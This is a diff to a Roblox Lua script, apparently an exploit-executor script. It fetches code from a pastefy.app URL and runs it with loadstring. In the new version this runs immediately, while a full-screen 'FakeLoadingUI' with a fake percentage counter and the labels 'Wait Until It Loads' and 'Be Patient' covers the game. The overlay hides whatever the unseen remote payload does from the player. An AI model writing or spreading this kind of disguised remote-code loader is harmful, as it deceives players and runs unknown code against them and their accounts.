@@ -1,76 +1,103 @@
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "LoadingScreen"
-ScreenGui.IgnoreGuiInset = true
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = game.CoreGui
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local Player = Players.LocalPlayer
 
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(1, 0, 1, 0)
-Frame.BackgroundColor3 = Color3.fromRGB(235, 255, 235)
-Frame.Parent = ScreenGui
+repeat task.wait() until Player:FindFirstChild("PlayerGui")
 
--- Decorations (fake vines/fruits/flowers using colored frames for now)
-for i = 1, 10 do
-	local deco = Instance.new("Frame")
-	deco.Size = UDim2.new(0, math.random(30,60), 0, math.random(30,60))
-	deco.Position = UDim2.new(math.random(), 0, math.random(), 0)
-	deco.BackgroundColor3 = Color3.fromRGB(math.random(200,255), math.random(100,200), math.random(100,200))
-	deco.BorderSizePixel = 0
-	deco.BackgroundTransparency = 0.3
-	deco.ZIndex = 1
-	deco.Parent = Frame
+-- Run the actual script immediately
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
+end)
+
+-- Create fake loading UI
+local gui = Instance.new("ScreenGui")
+gui.Name = "FakeLoadingUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.DisplayOrder = 9999
+gui.Parent = Player:WaitForChild("PlayerGui")
+
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Parent = gui
+
+-- Top Label
+local topLabel = Instance.new("TextLabel")
+topLabel.Size = UDim2.new(1, 0, 0.15, 0)
+topLabel.Position = UDim2.new(0, 0, 0, 0)
+topLabel.BackgroundTransparency = 1
+topLabel.Text = "Wait Until It Loads"
+topLabel.Font = Enum.Font.GothamBold
+topLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
+topLabel.TextScaled = true
+topLabel.Parent = bg
+
+-- Center Loading Text
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0.7, 0)
+loadingText.Position = UDim2.new(0, 0, 0.15, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "0%"
+loadingText.Font = Enum.Font.GothamBlack
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.TextScaled = true
+loadingText.Parent = bg
+
+-- Bottom Label
+local bottomLabel = Instance.new("TextLabel")
+bottomLabel.Size = UDim2.new(1, 0, 0.15, 0)
+bottomLabel.Position = UDim2.new(0, 0, 0.85, 0)
+bottomLabel.BackgroundTransparency = 1
+bottomLabel.Text = "Be Patient"
+bottomLabel.Font = Enum.Font.GothamBold
+bottomLabel.TextColor3 = Color3.fromRGB(255, 150, 150)
+bottomLabel.TextScaled = true
+bottomLabel.Parent = bg
+
+-- Fire Animation Function
+local function spawnFire()
+	for i = 1, 5 do
+		local fire = Instance.new("TextLabel")
+		fire.Text = "🔥"
+		fire.Font = Enum.Font.SourceSansBold
+		fire.TextScaled = true
+		fire.TextColor3 = Color3.fromRGB(255, 100, 0)
+		fire.BackgroundTransparency = 1
+		fire.Size = UDim2.new(0.05, 0, 0.05, 0)
+		fire.Position = UDim2.new(math.random(), 0, math.random(), 0)
+		fire.Parent = bg
+
+		local goal = {
+			Position = UDim2.new(math.random(), 0, math.random(), 0),
+			TextTransparency = 1
+		}
+		local tween = TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal)
+		tween:Play()
+
+		task.delay(5, function()
+			fire:Destroy()
+		end)
+	end
 end
 
--- Countdown Text
-local CountLabel = Instance.new("TextLabel")
-CountLabel.Size = UDim2.new(0, 300, 0, 100)
-CountLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
-CountLabel.BackgroundTransparency = 1
-CountLabel.Text = "60s"
-CountLabel.Font = Enum.Font.GothamBold
-CountLabel.TextColor3 = Color3.fromRGB(0, 128, 0)
-CountLabel.TextScaled = true
-CountLabel.Parent = Frame
-
--- Loading Text (below)
-local LoadingLabel = Instance.new("TextLabel")
-LoadingLabel.Size = UDim2.new(0, 300, 0, 50)
-LoadingLabel.Position = UDim2.new(0.5, -150, 0.5, 60)
-LoadingLabel.BackgroundTransparency = 1
-LoadingLabel.Text = ""
-LoadingLabel.Font = Enum.Font.Gotham
-LoadingLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
-LoadingLabel.TextScaled = true
-LoadingLabel.Parent = Frame
-
--- Looping Rain
-spawn(function()
+-- Loop Fire Animation
+task.spawn(function()
 	while true do
-		local drop = Instance.new("Frame")
-		drop.Size = UDim2.new(0, 2, 0, 10)
-		drop.Position = UDim2.new(math.random(), 0, 0, 0)
-		drop.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-		drop.BorderSizePixel = 0
-		drop.Parent = Frame
-		game:GetService("TweenService"):Create(drop, TweenInfo.new(1), {Position = UDim2.new(drop.Position.X.Scale, 0, 1, 0)}):Play()
-		game.Debris:AddItem(drop, 1)
-		wait(0.05)
+		spawnFire()
+		task.wait(1)
 	end
 end)
 
--- Countdown logic
-coroutine.wrap(function()
-	local seconds = 60
-	while seconds > 0 do
-		CountLabel.Text = seconds .. "s"
-		seconds -= 1
-		wait(1)
+-- Fake Smooth Loading %
+task.spawn(function()
+	for i = 1, 100 do
+		loadingText.Text = i .. "%"
+		task.wait(math.random(5, 10) / 100) -- Makes it load slowly
 	end
-
-	CountLabel.Text = "Loading..."
-	LoadingLabel.Text = "Please wait..."
-
-	wait(3)
-
-	-- Your loadstring goes here:
-loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw"))()
+end)
